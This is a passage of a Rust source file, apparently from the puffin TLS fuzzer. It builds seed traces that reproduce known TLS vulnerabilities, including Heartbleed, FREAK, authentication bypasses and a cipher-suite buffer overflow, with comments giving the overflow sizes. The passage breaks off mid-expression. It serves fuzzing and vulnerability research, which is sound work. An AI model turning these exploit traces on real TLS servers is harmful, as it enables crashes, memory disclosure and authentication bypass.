#![allow(dead_code)]

use puffin::{
    agent::{AgentDescriptor, AgentName, AgentType, TLSVersion},
    algebra::Term,
    term,
    trace::{Action, InputAction, OutputAction, Step, Trace},
};

use crate::{
    query::TlsQueryMatcher,
    tls::{
        fn_impl::*,
        rustls::msgs::enums::HandshakeType,
        seeds::{_seed_client_attacker12, _seed_client_attacker_full, seed_client_attacker},
    },
};

/// https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25638
pub fn seed_cve_2022_25638(server: AgentName) -> Trace<TlsQueryMatcher> {
    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_append_cipher_suite(
                (fn_new_cipher_suites()),
                fn_cipher_suite13_aes_128_gcm_sha256
            )),
            fn_compressions,
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            fn_client_extensions_new,
                            (fn_support_group_extension(fn_named_group_secp384r1))
                        )),
                        fn_signature_algorithm_extension
                    )),
                    (fn_key_share_deterministic_extension(fn_named_group_secp384r1))
                )),
                fn_supported_versions13_extension
            ))
        )
    };

    // ApplicationData 0 is EncryptedExtensions
    let certificate_request_message = term! {
        fn_decrypt_handshake(
            ((server, 1)[Some(TlsQueryMatcher::ApplicationData)]), // Ticket from last session
            (fn_server_hello_transcript(((server, 0)))),
            (fn_get_server_key_share(((server, 0)))),
            fn_no_psk,
            fn_named_group_secp384r1,
            fn_true,
            fn_seq_1
        )
    };

    let certificate_rsa = term! {
        fn_certificate13(
            (fn_get_context((@certificate_request_message))),
            //fn_empty_certificate_chain
            // Or append eve cert
            (fn_append_certificate_entry(
                (fn_certificate_entry(
                    fn_eve_cert
                )),
              fn_empty_certificate_chain
            ))
        )
    };

    let certificate_verify_rsa = term! {
        fn_certificate_verify(
            (fn_invalid_signature_algorithm),
            // Option 1 (something random, only possible because of fn_empty_certificate_chain, if FAIL_IF_NO_PEER_CERT is unset):
            //fn_eve_cert // or fn_empty_bytes_vec
            // Option 2 (impersonating eve, you have to send eve cert):
            fn_eve_pkcs1_signature
            // Option 3 (for testing):
            /* (fn_rsa_sign_client(
                (fn_certificate_transcript(((server, 0)))),
                fn_eve_private_key, // some random private key
                fn_rsa_pkcs1_signature_algorithm
            ))*/
        )
    };

    let client_finished = term! {
        fn_finished(
            (fn_verify_data(
                (fn_server_finished_transcript(((server, 0)))),
                (fn_server_hello_transcript(((server, 0)))),
                (fn_get_server_key_share(((server, 0)))),
                fn_no_psk,
                fn_named_group_secp384r1
            ))
        )
    };

    let trace = Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor {
            name: server,
            tls_version: TLSVersion::V1_3,
            typ: AgentType::Server,
            client_authentication: true,
            ..AgentDescriptor::default()
        }],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        @client_hello
                    },
                }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_encrypt_handshake(
                            (@certificate_rsa),
                            (fn_server_hello_transcript(((server, 0)))),
                            (fn_get_server_key_share(((server, 0)))),
                            fn_no_psk,
                            fn_named_group_secp384r1,
                            fn_true,
                            fn_seq_0  // sequence 0
                        )
                    },
                }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                         fn_encrypt_handshake(
                            (@certificate_verify_rsa),
                            (fn_server_hello_transcript(((server, 0)))),
                            (fn_get_server_key_share(((server, 0)))),
                            fn_no_psk,
                            fn_named_group_secp384r1,
                            fn_true,
                            fn_seq_1  // sequence 1
                        )
                    },
                }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_encrypt_handshake(
                            (@client_finished),
                            (fn_server_hello_transcript(((server, 0)))),
                            (fn_get_server_key_share(((server, 0)))),
                            fn_no_psk,
                            fn_named_group_secp384r1,
                            fn_true,
                            fn_seq_2  // sequence 2
                        )
                    },
                }),
            },
        ],
    };

    trace
}

/// https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25640
pub fn seed_cve_2022_25640(server: AgentName) -> Trace<TlsQueryMatcher> {
    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_append_cipher_suite(
                (fn_new_cipher_suites()),
                fn_cipher_suite13_aes_128_gcm_sha256
            )),
            fn_compressions,
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            fn_client_extensions_new,
                            (fn_support_group_extension(fn_named_group_secp384r1))
                        )),
                        fn_signature_algorithm_extension
                    )),
                    (fn_key_share_deterministic_extension(fn_named_group_secp384r1))
                )),
                fn_supported_versions13_extension
            ))
        )
    };

    // ApplicationData 0 is EncryptedExtensions
    let certificate_request_message = term! {
        fn_decrypt_handshake(
            ((server, 1)[Some(TlsQueryMatcher::ApplicationData)]),
            (fn_server_hello_transcript(((server, 0)))),
            (fn_get_server_key_share(((server, 0)))),
            fn_no_psk,
            fn_named_group_secp384r1,
            fn_true,
            fn_seq_1
        )
    };

    let certificate = term! {
        fn_certificate13(
            (fn_get_context((@certificate_request_message))),
            (fn_append_certificate_entry(
                (fn_certificate_entry(
                    fn_eve_cert
                )),
              fn_empty_certificate_chain
            ))
        )
    };

    let client_finished = term! {
        fn_finished(
            (fn_verify_data(
                (fn_certificate_transcript(((server, 0)))),
                (fn_server_hello_transcript(((server, 0)))),
                (fn_get_server_key_share(((server, 0)))),
                fn_no_psk,
                fn_named_group_secp384r1
            ))
        )
    };

    let trace = Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor {
            name: server,
            tls_version: TLSVersion::V1_3,
            typ: AgentType::Server,
            client_authentication: true,
            ..AgentDescriptor::default()
        }],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        @client_hello
                    },
                }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_encrypt_handshake(
                            (@certificate),
                            (fn_server_hello_transcript(((server, 0)))),
                            (fn_get_server_key_share(((server, 0)))),
                            fn_no_psk,
                            fn_named_group_secp384r1,
                            fn_true,
                            fn_seq_0  // sequence 0
                        )
                    },
                }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_encrypt_handshake(
                            (@client_finished),
                            (fn_server_hello_transcript(((server, 0)))),
                            (fn_get_server_key_share(((server, 0)))),
                            fn_no_psk,
                            fn_named_group_secp384r1,
                            fn_true,
                            fn_seq_1  // sequence 1
                        )
                    },
                }),
            },
        ],
    };

    trace
}

pub fn seed_cve_2021_3449(server: AgentName) -> Trace<TlsQueryMatcher> {
    let (mut trace, client_verify_data) = _seed_client_attacker12(server);

    let renegotiation_client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_append_cipher_suite(
                (fn_new_cipher_suites()),
                // force TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
                fn_cipher_suite12
            )),
            fn_compressions,
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            (fn_client_extensions_append(
                                fn_client_extensions_new,
                                (fn_support_group_extension(fn_named_group_secp384r1))
                            )),
                            fn_ec_point_formats_extension
                        )),
                        fn_signed_certificate_timestamp_extension
                    )),
                     // Enable Renegotiation
                    (fn_renegotiation_info_extension((@client_verify_data)))
                )),
                // Add signature cert extension
                fn_signature_algorithm_cert_extension
            ))
        )
    };

    trace.steps.push(Step {
        agent: server,
        action: Action::Input(InputAction {
            recipe: term! {
                fn_encrypt12(
                    (@renegotiation_client_hello),
                    ((server, 0)),
                    (fn_decode_ecdh_pubkey(
                        ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerKeyExchange)))]/Vec<u8>) // ServerECDHParams
                    )),
                    fn_named_group_secp384r1,
                    fn_true,
                    fn_seq_1
                )
            },
        }),
    });

    /*trace.steps.push(Step {
        agent: server,
        action: Action::Input(InputAction {
            recipe: term! {
                fn_encrypt12(
                    renegotiation_client_hello,
                    ((server, 0)),
                    (fn_decode_ecdh_pubkey(
                        ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerKeyExchange)))]/Vec<u8>) // ServerECDHParams
                    )),
                    fn_named_group_secp384r1,
                    fn_true,
                    fn_seq_1
                )
            },
        }),
    });*/

    trace
}

pub fn seed_heartbleed(client: AgentName, server: AgentName) -> Trace<TlsQueryMatcher> {
    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_append_cipher_suite(
                (fn_new_cipher_suites()),
                // force TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
                fn_cipher_suite12
            )),
            fn_compressions,
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        fn_client_extensions_new,
                        (fn_support_group_extension(fn_named_group_secp384r1))
                    )),
                    fn_ec_point_formats_extension
                )),
                fn_signed_certificate_timestamp_extension
            ))
        )
    };

    let trace = Trace {
        prior_traces: vec![],
        descriptors: vec![
            AgentDescriptor::new_client(client, TLSVersion::V1_2),
            AgentDescriptor::new_server(server, TLSVersion::V1_2),
        ],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: client_hello,
                }),
            },
            // Send directly after client_hello such that this does not need to be encrypted
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_heartbeat_fake_length(fn_empty_bytes_vec, fn_large_length)
                    },
                }),
            },
        ],
    };

    trace
}

pub fn seed_freak(client: AgentName, server: AgentName) -> Trace<TlsQueryMatcher> {
    Trace {
        prior_traces: vec![],
        descriptors: vec![
            AgentDescriptor::new_client(client, TLSVersion::V1_2),
            AgentDescriptor::new_server(server, TLSVersion::V1_2),
        ],
        steps: vec![
            OutputAction::new_step(client),
            // Client Hello, Client -> Server
            InputAction::new_step(
                server,
                term! {
                    fn_client_hello(
                        ((client, 0)),
                        ((client, 0)),
                        ((client, 0)),
                        (fn_append_cipher_suite(
                            (fn_new_cipher_suites()),
                            fn_weak_export_cipher_suite
                        )),
                        ((client, 0)),
                        ((client, 0))
                    )
                },
            ),
            // Server Hello, Server -> Client
            InputAction::new_step(
                client,
                term! {
                    fn_server_hello(
                        ((server, 0)),
                        ((server, 0)),
                        ((server, 0)),
                        (fn_secure_rsa_cipher_suite12),
                        ((server, 0)),
                        ((server, 0))
                    )
                },
            ),
            // Server Certificate, Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_certificate(
                            ((server, 0))
                        )
                    },
                }),
            },
            // Server Key Exchange, Server -> Client
            // If the KEX fails here, then no ephemeral KEX is used
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_server_key_exchange(  // check whether the client rejects this if it does not support export
                            ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerKeyExchange)))]/Vec<u8>)
                        )
                    },
                }),
            },
            // Server Hello Done, Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_server_hello_done
                    },
                }),
            },
            // Client Key Exchange, Client -> Server
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_client_key_exchange(
                             ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientKeyExchange)))]/Vec<u8>)
                        )
                    },
                }),
            },
            // Client Change Cipher Spec, Client -> Server
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_change_cipher_spec
                    },
                }),
            },
        ],
    }
}

/// A simplified version of [`seed_cve_2022_25640`]
pub fn seed_cve_2022_25640_simple(server: AgentName) -> Trace<TlsQueryMatcher> {
    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_append_cipher_suite(
                (fn_new_cipher_suites()),
                fn_cipher_suite13_aes_128_gcm_sha256
            )),
            fn_compressions,
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            fn_client_extensions_new,
                            (fn_support_group_extension(fn_named_group_secp384r1))
                        )),
                        fn_signature_algorithm_extension
                    )),
                    (fn_key_share_deterministic_extension(fn_named_group_secp384r1))
                )),
                fn_supported_versions13_extension
            ))
        )
    };

    let client_finished = term! {
        fn_finished(
            (fn_verify_data(
                (fn_server_finished_transcript(((server, 0)))),
                (fn_server_hello_transcript(((server, 0)))),
                (fn_get_server_key_share(((server, 0)))),
                fn_no_psk,
                fn_named_group_secp384r1
            ))
        )
    };

    let trace = Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor {
            name: server,
            tls_version: TLSVersion::V1_3,
            typ: AgentType::Server,
            client_authentication: true,
            ..AgentDescriptor::default()
        }],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        @client_hello
                    },
                }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_encrypt_handshake(
                            (@client_finished),
                            (fn_server_hello_transcript(((server, 0)))),
                            (fn_get_server_key_share(((server, 0)))),
                            fn_no_psk,
                            fn_named_group_secp384r1,
                            fn_true,
                            fn_seq_0  // sequence 0
                        )
                    },
                }),
            },
        ],
    };

    trace
}

pub fn seed_cve_2022_38153(client: AgentName, server: AgentName) -> Trace<TlsQueryMatcher> {
    Trace {
        prior_traces: vec![],
        descriptors: vec![
            AgentDescriptor::new_client(client, TLSVersion::V1_2),
            AgentDescriptor::new_server(server, TLSVersion::V1_2),
        ],
        steps: vec![
            OutputAction::new_step(client),
            // Client Hello, Client -> Server
            InputAction::new_step(
                server,
                term! {
                    fn_client_hello(
                        ((client, 0)),
                        ((client, 0)),
                        ((client, 0)),
                        ((client, 0)),
                        ((client, 0)),
                        ((client, 0))
                    )
                },
            ),
            // Server Hello, Server -> Client
            InputAction::new_step(
                client,
                term! {
                        fn_server_hello(
                            ((server, 0)),
                            ((server, 0)),
                            ((client, 0)),
                            ((server, 0)),
                            ((server, 0)),
                            ((server, 0))
                        )
                },
            ),
            // Server Certificate, Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_certificate(
                            ((server, 0))
                        )
                    },
                }),
            },
            // Server Key Exchange, Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_server_key_exchange(
                            ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerKeyExchange)))]/Vec<u8>)
                        )
                    },
                }),
            },
            // Server Hello Done, Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_server_hello_done
                    },
                }),
            },
            // Client Key Exchange, Client -> Server
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_client_key_exchange(
                            ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientKeyExchange)))]/Vec<u8>)
                        )
                    },
                }),
            },
            // Client Change Cipher Spec, Client -> Server
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_change_cipher_spec
                    },
                }),
            },
            // Client Handshake Finished, Client -> Server
            // IMPORTANT: We are using here OpaqueMessage as the parsing code in src/io.rs does
            // not know that the Handshake record message is encrypted. The parsed message from the
            // could be a HelloRequest if the encrypted data starts with a 0.
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_opaque_message(
                            ((client, 3)[None])
                        )
                    },
                }),
            },
            // NewSessionTicket, Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_new_session_ticket(
                            ((server, 0)/u64),
                            fn_large_bytes_vec
                        )
                    },
                }),
            },
        ],
    }
}

pub fn seed_cve_2022_39173(initial_server: AgentName, server: AgentName) -> Trace<TlsQueryMatcher> {
    let initial_handshake = seed_client_attacker(initial_server);

    let new_ticket_message = term! {
        fn_decrypt_application(
            ((initial_server, 4)[Some(TlsQueryMatcher::ApplicationData)]), // Ticket from last session
            (fn_server_hello_transcript(((initial_server, 0)))),
            (fn_server_finished_transcript(((initial_server, 0)))),
            (fn_get_server_key_share(((initial_server, 0)))),
            fn_no_psk,
            fn_named_group_secp384r1,
            fn_true,
            fn_seq_0 // sequence restarts at 0 because we are decrypting now traffic
        )
    };

    let mut cipher_suites = term! { fn_new_cipher_suites() };
    for _ in 0..12 {
        // also works with 149, 150 leads a too large list of suites (as expected)
        // Maximum reached suitesSz value depending on the number of ciphers in the list:
        // 149 -> suiteSz reaches >29461 (overflow of > 29161 bytes)
        // 14 -> suiteSz reaches 450 (overflow of 150 bytes)
        // 13 -> suiteSz reaches 392  (overflow of 92 bytes)
        // 12 -> suiteSz reaches 338  (overflow of 38 bytes)
        // 11 -> suiteSz remains below 300
        cipher_suites = term! {
            fn_append_cipher_suite(
                (@cipher_suites),
                fn_cipher_suite13_aes_128_gcm_sha256 // For 5.5.0 this MUST be a supported cipher suite
                //fn_cipher_suite12 // Works for 5.4.0
            )
        };
    }

    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_append_cipher_suite(
                 (@cipher_suites), // CHANGED FROM: (fn_new_cipher_suites()),
                // CHANGED FROM fn_cipher_suite13_aes_128_gcm_sha256
                fn_cipher_suite13_aes_256_gcm_sha384
            )),
            fn_compressions,
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            (fn_client_extensions_append(
                                fn_client_extensions_new,
                                // CHANGED from: (fn_client_extensions_append(
                                // CHANGED from:     fn_client_extensions_new,
                                // CHANGED from:     (fn_support_group_extension(fn_named_group_secp384r1))
                                // CHANGED from: )),
                                // ^ lacks of the above makes the server enter a `SERVER_HELLO_RETRY_REQUEST_COMPLETE` state
                                fn_signature_algorithm_extension
                            )),
                            fn_supported_versions13_extension
                        )),
                        (fn_key_share_deterministic_extension(fn_named_group_secp384r1))
                    )),
                    fn_psk_exchange_mode_dhe_ke_extension
                )),
                // https://datatracker.ietf.org/doc/html/rfc8446#section-2.2
                // must be last in client_hello, and initially empty until filled by fn_fill_binder
                (fn_preshared_keys_extension_empty_binder(
                    (@new_ticket_message)
                ))
            ))
        )
    };

    let psk = term! {
        fn_derive_psk(
            (fn_server_hello_transcript(((initial_server, 0)))),
            (fn_server_finished_transcript(((initial_server, 0)))),
            (fn_client_finished_transcript(((initial_server, 0)))),
            (fn_get_server_key_share(((initial_server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerHello)))]))),
            (fn_get_ticket_nonce((@new_ticket_message))),
            fn_named_group_secp384r1
        )
    };

    let binder = term! {
        fn_derive_binder(
            (@client_hello),
            (@psk)
        )
    };

    let full_client_hello = term! {
        fn_fill_binder(
            (@client_hello),
            (@binder)
        )
    };

    let trace = Trace {
        // Step 1: Prior trace performs an initial TLS 1.3 session with a full handshake and
        // establishes a PSK, including Client Hello number 1 (`CH1`).
        prior_traces: vec![initial_handshake],
        descriptors: vec![AgentDescriptor::new_server(server, TLSVersion::V1_3)],
        steps: vec![
            // Step 2: sends a Client Hello (CH2) with a missing support_group_extension that will make the server
            // enters the state `SERVER_HELLO_RETRY_REQUEST_COMPLETE` and with PSK resuming previous session.
            // CH2 includes a list of repeated ciphers that will be stored in ssl->suites->suites.
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        @full_client_hello
                    },
                }),
            },
            // Step 3: sends a Client Hello (CH3) with a missing support_group_extension that will keep the server
            // in the state `SERVER_HELLO_RETRY_REQUEST_COMPLETE` and with PSK resuming previous session.
            // CH3 includes a list of repeated ciphers that will be matched against ssl->suites->suites.
            // Since ssl->suites->suites already contain repeated ciphers, the function refineSuites in tls13.c
            // will wrongly consider all pairs leading to an explosion of sizeSz and the buffer overflow.
            // Note: CH3 could also include support_group_extension.
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        @full_client_hello
                    },
                }),
            },
        ],
    };

    trace
}

pub fn seed_cve_2022_39173_full(
    initial_server: AgentName,
    server: AgentName,
) -> Trace<TlsQueryMatcher> {
    let (
        initial_handshake,
        server_hello_transcript,
        server_finished_transcript,
        client_finished_transcript,
    ) = _seed_client_attacker_full(initial_server);

    let new_ticket_message = term! {
        fn_decrypt_application(
            ((initial_server, 4)[Some(TlsQueryMatcher::ApplicationData)]), // Ticket?
            (@server_hello_transcript),
            (@server_finished_transcript),
            (fn_get_server_key_share(((initial_server, 0)))),
            fn_no_psk,
            fn_named_group_secp384r1,
            fn_true,
            fn_seq_0 // sequence restarts at 0 because we are decrypting now traffic
        )
    };

    let mut cipher_suites = term! { fn_new_cipher_suites() };

    for _ in 0..100 {
        // 200 is too large already
        cipher_suites = term! {
            fn_append_cipher_suite(
                (@cipher_suites),
                fn_cipher_suite13_aes_128_gcm_sha256 // For 5.5.0 this MUST be a supported cipher suite
                //fn_cipher_suite12 // Works for 5.4.0
            )
        };
    }

    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_append_cipher_suite(
                 (@cipher_suites), // CHANGED FROM: (fn_new_cipher_suites()),
                fn_cipher_suite13_aes_128_gcm_sha256
            )),
            fn_compressions,
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            (fn_client_extensions_append(
                                fn_client_extensions_new,
                                // CHANGED from: (fn_client_extensions_append(
                                // CHANGED from:     fn_client_extensions_new,
                                // CHANGED from:     (fn_support_group_extension(fn_named_group_secp384r1))
                                // CHANGED from: )),
                                fn_signature_algorithm_extension
                            )),
                            fn_supported_versions13_extension
                        )),
                        (fn_key_share_deterministic_extension(fn_named_group_secp384r1))
                    )),
                    fn_psk_exchange_mode_dhe_ke_extension
                )),
                // https://datatracker.ietf.org/doc/html/rfc8446#section-2.2
                // must be last in client_hello, and initially empty until filled by fn_fill_binder
                (fn_preshared_keys_extension_empty_binder(
                    (@new_ticket_message)
                ))
            ))
        )
    };

    let psk = term! {
        fn_derive_psk(
            (@server_hello_transcript),
            (@server_finished_transcript),
            (@client_finished_transcript),
            (fn_get_server_key_share(((initial_server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerHello)))]))),
            (fn_get_ticket_nonce((@new_ticket_message))),
            fn_named_group_secp384r1
        )
    };

    let binder = term! {
        fn_derive_binder(
            (@client_hello),
            (@psk)
        )
    };

    let full_client_hello = term! {
        fn_fill_binder(
            (@client_hello),
            (@binder)
        )
    };

    let trace = Trace {
        prior_traces: vec![initial_handshake],
        descriptors: vec![AgentDescriptor::new_server(server, TLSVersion::V1_3)],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        @full_client_hello
                    },
                }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        @full_client_hello
                    },
                }),
            },
        ],
    };

    trace
}

pub fn seed_cve_2022_39173_complete(
    initial_server: AgentName,
    server: AgentName,
) -> Trace<TlsQueryMatcher> {
    let initial_handshake = seed_client_attacker(initial_server);

    let new_ticket_message = term! {
        fn_decrypt_application(
            ((initial_server, 4)[Some(TlsQueryMatcher::ApplicationData)]), // Ticket from last session
            (fn_server_hello_transcript(((initial_server, 0)))),
            (fn_server_finished_transcript(((initial_server, 0)))),
            (fn_get_server_key_share(((initial_server, 0)))),
            fn_no_psk,
            fn_named_group_secp384r1,
            fn_true,
            fn_seq_0 // sequence restarts at 0 because we are decrypting now traffic
        )
    };

    let mut cipher_suites = term! { fn_new_cipher_suites() };
    for _ in 0..12 {
        // also works with 149, 150 leads a too large list of suites (as expected)
        // Maximum reached suitesSz value depending on the number of ciphers in the list:
        // 149 -> suiteSz reaches >29461 (overflow of > 29161 bytes)
        // 14 -> suiteSz reaches 450 (overflow of 150 bytes)
        // 13 -> suiteSz reaches 392  (overflow of 92 bytes)
        // 12 -> suiteSz reaches 338  (overflow of 38 bytes)
        // 11 -> suiteSz remains below 300
        cipher_suites = term! {
            fn_append_cipher_suite(
                (@cipher_suites),
                fn_cipher_suite13_aes_128_gcm_sha256 // For 5.5.0 this MUST be a supported cipher suite
                //fn_cipher_suite12 // Works for 5.4.0
            )
        };
    }

    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_append_cipher_suite(
                 (@cipher_suites), // CHANGED FROM: (fn_new_cipher_suites()),
                // CHANGED FROM fn_cipher_suite13_aes_128_gcm_sha256
                fn_cipher_suite13_aes_256_gcm_sha384
            )),
            fn_compressions,
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            (fn_client_extensions_append(
                                fn_client_extensions_new,
                                // CHANGED from: (fn_client_extensions_append(
                                // CHANGED from:     fn_client_extensions_new,
                                // CHANGED from:     (fn_support_group_extension(fn_named_group_secp384r1))
                                // CHANGED from: )),
                                // ^ lacks of the above makes the server enter a `SERVER_HELLO_RETRY_REQUEST_COMPLETE` state
                                fn_signature_algorithm_extension
                            )),
                            fn_supported_versions13_extension
                        )),
                        (fn_key_share_deterministic_extension(fn_named_group_secp384r1))
                    )),
                    fn_psk_exchange_mode_dhe_ke_extension
                )),
                // https://datatracker.ietf.org/doc/html/rfc8446#section-2.2
                // must be last in client_hello, and initially empty until filled by fn_fill_binder
                (fn_preshared_keys_extension_empty_binder(
                    (@new_ticket_message)
                ))
            ))
        )
    };

    let psk = term! {
        fn_derive_psk(
            (fn_server_hello_transcript(((initial_server, 0)))),
            (fn_server_finished_transcript(((initial_server, 0)))),
            (fn_client_finished_transcript(((initial_server, 0)))),
            (fn_get_server_key_share(((initial_server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerHello)))]))),
            (fn_get_ticket_nonce((@new_ticket_message))),
            fn_named_group_secp384r1
        )
    };

    let binder = term! {
        fn_derive_binder(
            (@client_hello),
            (@psk)
        )
    };

    let full_client_hello = term! {
        fn_fill_binder(
            (@client_hello),
            (@binder)
        )
    };

    let initial_client_hello = match &initial_handshake.steps[0].action {
        Action::Input(action) => Some(action.recipe.clone()),
        Action::Output(_) => None,
    }
    .unwrap();

    let full_client_hello_3 = term! {
        fn_fill_binder(
            (@initial_client_hello),
            (@binder)
        )
    };

    let trace = Trace {
        // Step 1: Prior trace performs an initial TLS 1.3 session with a full handshake and
        // establishes a PSK, including Client Hello number 1 (`CH1`).
        prior_traces: vec![initial_handshake],
        descriptors: vec![AgentDescriptor::new_server(server, TLSVersion::V1_3)],
        steps: vec![
            // Step 2: sends a Client Hello (CH2) with a missing support_group_extension that will make the server
            // enters the state `SERVER_HELLO_RETRY_REQUEST_COMPLETE` and with PSK resuming previous session.
            // CH2 includes a list of repeated ciphers that will be stored in ssl->suites->suites.
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        @full_client_hello
                    },
                }),
            },
            // Step 3: sends a Client Hello (CH3) with a missing support_group_extension that will keep the server
            // in the state `SERVER_HELLO_RETRY_REQUEST_COMPLETE` and with PSK resuming previous session.
            // CH3 includes a list of repeated ciphers that will be matched against ssl->suites->suites.
            // Since ssl->suites->suites already contain repeated ciphers, the function refineSuites in tls13.c
            // will wrongly consider all pairs leading to an explosion of sizeSz and the buffer overflow.
            // Note: CH3 includes here support_group_extension so that it can lead to a full handshake
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        @full_client_hello_3
                    },
                }),
            },
        ],
    };

    trace
}

pub fn seed_cve_2022_39173_minimized(server: AgentName) -> Trace<TlsQueryMatcher> {
    // WAS REQUIRED: let initial_handshake = seed_client_attacker(initial_server);

    let new_ticket_message = term! {
        fn_new_session_ticket13(  // DUMMY resumption ticket
            fn_alice_cert,
            fn_alice_cert,
            fn_new_session_ticket_extensions_new
        )
        // WAS:
        // fn_decrypt_application(
        //     ((initial_server, 4)[Some(TlsQueryMatcher::ApplicationData)]), // Ticket from last session
        //     (fn_server_hello_transcript(((initial_server, 0)))),
        //     (fn_server_finished_transcript(((initial_server, 0)))),
        //     (fn_get_server_key_share(((initial_server, 0)))),
        //     fn_no_psk,
        //     fn_named_group_secp384r1,
        //     fn_true,
        //     fn_seq_0 // sequence restarts at 0 because we are decrypting now traffic
        // )
    };

    let mut cipher_suites = term! { fn_new_cipher_suites() };
    for _ in 0..149 {
        // also works with 149, 150 leads a too large list of suites (as expected)
        // Maximum reached suitesSz value depending on the number of ciphers in the list:
        // 149 -> suiteSz reaches >29461 (overflow of > 29161 bytes)
        // 14 -> suiteSz reaches 450 (overflow of 150 bytes)
        // 13 -> suiteSz reaches 392  (overflow of 92 bytes)
        // 12 -> suiteSz reaches 338  (overflow of 38 bytes)
        // 11 -> suiteSz remains below 300
        cipher_suites = term! {
            fn_append_cipher_suite(
                (@cipher_suites),
                fn_cipher_suite13_aes_256_gcm_sha384 // For 5.5.0 this MUST be a supported cipher suite
                //fn_cipher_suite12 // Works for 5.4.0
            )
        };
    }

    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_append_cipher_suite(
                 (@cipher_suites), // CHANGED FROM: (fn_new_cipher_suites()),
                // CHANGED FROM fn_cipher_suite13_aes_128_gcm_sha256
                fn_cipher_suite13_aes_256_gcm_sha384
            )),
            fn_compressions,
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
